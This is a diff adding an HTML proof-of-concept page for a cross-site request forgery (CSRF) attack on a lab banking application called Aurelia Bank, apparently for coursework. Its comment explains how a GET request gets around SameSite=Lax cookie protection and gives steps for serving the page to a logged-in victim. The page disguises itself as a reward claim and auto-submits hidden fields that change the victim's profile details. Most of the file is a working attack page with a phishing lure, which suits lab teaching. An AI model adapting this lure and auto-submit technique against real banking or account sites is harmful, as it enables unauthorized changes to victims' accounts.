@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<!--
+  Aurelia Bank — CSRF Proof-of-Concept  (GET variant)
+  ===========================================================================
+  ACADEMIC USE ONLY, against your own isolated Aurelia Bank test VM.
+
+  Why GET? Modern browsers default the session cookie to SameSite=Lax, which
+  does NOT attach the cookie to cross-site POST requests but DOES attach it to
+  a top-level GET navigation. Because the vulnerable profile endpoint accepts
+  GET, this auto-submitting GET form performs a genuine cross-site, authenticated
+  state change while carrying the victim's Lax session cookie. This is the
+  reliable way to demonstrate CSRF over the lab's plain-HTTP setup.
+
+  HOW TO USE
+    1. Arm VULN_CSRF on the victim VM (config.local.php) and log in as the test
+       customer (e.g. jdoe) in that browser.
+    2. Edit VICTIM below to the victim app's base URL.
+    3. Serve this file from Kali (e.g. `python3 -m http.server 8000`) and open it
+       in the SAME browser session that is logged into the bank.
+    4. The form auto-submits; the victim lands on their profile with the changed
+       details -> the "Full name" now reads "John Doe (CSRF-POC)".
+
+  The values target the fictional 'jdoe' test account; the email is left as the
+  account's own so the change is harmless and the account stays usable. Adjust
+  them if you are demonstrating against a different test account.
+-->
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>You've won an Aurelia reward! 🎁</title>
+    <style>
+        body { font-family: system-ui, sans-serif; margin: 4rem auto; max-width: 32rem; text-align: center; color: #222; }
+        .card { border: 1px solid #e5e7eb; border-radius: 12px; padding: 2rem; box-shadow: 0 6px 20px rgba(0,0,0,.06); }
+        button { padding: .7rem 1.2rem; border: 0; border-radius: 8px; background: #4f46e5; color: #fff; font-size: 1rem; cursor: pointer; }
+        small { color: #6b7280; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>Congratulations! 🎉</h1>
+        <p>You've been selected for an exclusive Aurelia Bank reward.</p>
+        <p>Claiming your reward now&hellip;</p>
+
+        <!-- VICTIM: change to the victim app's base URL on your test network -->
+        <form id="poc" method="GET" action="http://VICTIM/aurelia-bank/customer/profile.php">
+            <input type="hidden" name="form"      value="profile">
+            <input type="hidden" name="full_name" value="John Doe (CSRF-POC)">
+            <input type="hidden" name="email"     value="john.doe@example.test">
+            <input type="hidden" name="phone"     value="+1-202-555-0182">
+            <input type="hidden" name="address"   value="Address changed by CSRF proof-of-concept">
+            <noscript><button type="submit">Claim your reward</button></noscript>
+        </form>
+
+        <small>This is a controlled academic CSRF demonstration.</small>
+    </div>
+
+    <script>
+        // Auto-submit on load: a top-level GET navigation that carries the
+        // victim's SameSite=Lax session cookie.
+        document.getElementById('poc').submit();
+    </script>
+</body>
+</html>
